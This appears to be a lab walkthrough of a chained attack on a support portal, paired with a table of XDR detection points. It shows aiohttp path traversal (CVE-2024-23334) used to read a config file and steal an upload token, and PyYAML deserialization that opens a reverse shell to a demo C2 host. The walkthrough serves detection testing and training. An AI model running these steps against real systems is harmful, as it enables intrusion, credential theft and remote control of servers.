# Attack Walkthrough — 12-Step CVE Chain

> **Lab demo only.** All scripts target a controlled lab VM.

## Prerequisites

- VM-1 running support-portal (`TARGET=<vm1-ip>:8080`)
- VM-2 running `demo_c2/listener.py` with `demo-c2.local` resolving to VM-2
- Python 3.10+, curl, (optional) nmap

## Steps

### 0. Prepare payload files

```bash
# Generate evil-profile.yaml (reverse shell payload)
./generate-evil-profile.sh demo-c2.local 4444

# Create benign-bundle.zip (trigger file)
./make-bundle.sh
```

### 1–2. Fingerprint

```bash
TARGET=<vm1-ip>:8080 ./01-fingerprint.sh
```

Look for `Server: Python/3.10 aiohttp/3.9.1` — confirms vulnerable version.

### 3–4. Directory traversal → read config (CVE-2024-23334)

```bash
TARGET=<vm1-ip>:8080 ./02-traversal-config.sh
```

Read `app_config.yaml` via path traversal. Use `--path-as-is` to prevent curl
from normalizing `../` sequences. Note `internal_routes.diagnostic_profile_upload`
path and `secrets.profile_upload_token_file` path.

Example URL: `http://target:8080/static/x/../../config/app_config.yaml`

Note: curl normalizes `../` by default. Use `--path-as-is` to send the literal
path to the server. A dummy path component (`x/`) before `../` ensures curl
does not strip the traversal sequence entirely.

### 5. (Offline) Parse config to find token file path

From config: `/opt/support-portal/secrets/profile-upload-token`

### 6. Directory traversal → steal token

```bash
TARGET=<vm1-ip>:8080 ./03-traversal-token.sh
```

Output: `demo-profile-admin-token-2026`

### 7–8. Upload evil profile (uses stolen token)

```bash
TARGET=<vm1-ip>:8080 TOKEN=demo-profile-admin-token-2026 ./04-upload-evil-profile.sh
```

This calls `/internal/app-owner/profile/upload` with the malicious YAML,
overwriting `active.yaml` on VM-1.

### 9–11. Trigger yaml.load → reverse shell

```bash
TARGET=<vm1-ip>:8080 ./05-trigger.sh
```

VM-1 `DiagnosticEngine` calls `yaml.load(active.yaml, Loader=yaml.Loader)`.
PyYAML deserializes `!!python/object/apply` → spawns `bash -i` → connects
back to `demo-c2.local:4444`.

### 12. Interact on C2

In the terminal running `demo_c2/listener.py`:

```text
[demo-c2] Connection received.
$ id
uid=999(support-portal) gid=999(support-portal) ...
$ whoami
support-portal
```

## XDR Detection Points

| # | Event |
| --- | --- |
| 1 | External TCP scan on port 8080 |
| 2 | HTTP recon — `aiohttp/3.9.1` in Server header |
| 3–4 | aiohttp process reads `/opt/support-portal/config/*` via path traversal |
| 6 | aiohttp process reads `/opt/support-portal/secrets/*` |
| 7 | Internal endpoint `/internal/app-owner/profile/upload` called by external IP |
| 8 | `profiles/active.yaml` overwritten |
| 9 | `yaml.load` invoked on modified profile |
| 10 | `python` → `bash -i` child process spawned |
| 11 | `bash` process opens outbound TCP to port 4444 |
| 12 | XDR correlates events 1+3+6+7+8+10+11 into single attack chain |
